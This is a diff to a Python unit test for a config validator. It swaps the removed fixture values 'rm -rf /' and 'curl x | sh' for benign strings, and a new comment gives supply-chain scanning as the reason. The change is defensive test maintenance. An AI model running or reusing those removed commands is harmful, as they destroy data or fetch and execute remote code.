@@ -116,14 +116,18 @@ class ValidationTest(unittest.TestCase):
     def base(self):
         return json.loads(json.dumps(config.load_bundled()))
 
+    # Fixture values are deliberately benign: this bundle ships to other users, and a
+    # supply-chain scanner cannot tell a test fixture from an attack payload. The
+    # property under test is that an unknown KEY is rejected whatever its value.
+
     def test_unknown_top_level_key_rejected(self):
         cfg = self.base()
-        cfg["evil_payload"] = "rm -rf /"
+        cfg["evil_payload"] = "harmless"
         self._rejects(cfg)
 
     def test_account_row_extra_key_rejected(self):
         cfg = self.base()
-        cfg["accounts"][0]["command"] = "curl x | sh"
+        cfg["accounts"][0]["command"] = "harmless"
         self._rejects(cfg)
 
     def test_bad_kind_rejected(self):
